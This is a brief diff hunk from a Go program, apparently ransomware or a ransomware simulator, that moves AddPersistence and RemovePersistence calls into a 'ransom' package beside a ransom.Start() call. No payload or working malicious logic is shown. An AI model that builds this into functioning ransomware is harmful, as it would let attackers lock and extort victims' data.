@@ -43,7 +43,7 @@ func main() {
 		fmt.Scanln()
 	}
 
-	AddPersistence()
+	ransom.AddPersistence()
 	ransom.Start()
-	RemovePersistence()
+	ransom.RemovePersistence()
 }
